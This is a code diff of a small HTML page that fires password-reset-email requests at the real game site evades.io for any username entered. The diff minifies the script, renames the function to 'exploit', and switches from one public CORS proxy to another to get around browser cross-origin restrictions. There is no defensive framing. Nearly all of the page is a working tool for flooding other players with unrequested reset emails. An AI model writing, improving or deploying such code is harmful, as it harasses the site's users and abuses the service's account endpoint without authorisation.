@@ -3,51 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LOL</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 50px;
-        }
-        input, button {
-            padding: 10px;
-            margin: 10px;
-            font-size: 16px;
-        }
-    </style>
+    <title>lmao</title>
+    <style>body{font-family:Arial,sans-serif;text-align:center;margin:50px}input,button{padding:10px;margin:10px;font-size:16px}</style>
 </head>
 <body>
-    <h2>meme found by kya</h2>
-    <input type="text" id="username" placeholder="Enter username">
-    <button onclick="sigma()">hack!!1</button>
-    <p id="response"></p>
-
+    <h2>discovered by kya</h2>
+    <input type="text" id="userInput" placeholder="Username here">
+    <button onclick="exploit()">fire!!!</button>
+    <p id="statusMsg"></p>
     <script>
-        function sigma() {
-            const username = document.getElementById("username").value;
-            if (!username) {
-                alert("Please enter a username.");
-                return;
-            }
-
-            fetch("https://cors-anywhere.herokuapp.com/https://evades.io/api/account/send_password_reset_email", {
-                method: "POST",
-                headers: {
-                    "accept": "*/*",
-                    "content-type": "application/json"
-                },
-                body: JSON.stringify({ username })
-            })
-            .then(response => response.text())
-            .then(text => {
-                document.getElementById("response").innerText = text;
-            })
-            .catch(error => {
-                console.error("-> ", error);
-                document.getElementById("response").innerText = "email probably couldnt have been sent";
-            });
-        }
+        function exploit(){const e=document.getElementById("userInput").value;if(!e)return void alert("Insert a valid username.");fetch("https://api.allorigins.win/raw?url="+encodeURIComponent("https://evades.io/api/account/send_password_reset_email"),{method:"POST",headers:{"accept":"*/*","content-type":"application/json"},body:JSON.stringify({username:e})}).then(e=>e.text()).then(e=>{document.getElementById("statusMsg").innerText=e}).catch(e=>{console.error("Issue:",e),document.getElementById("statusMsg").innerText="Something went wrong."})}
     </script>
 </body>
 </html>
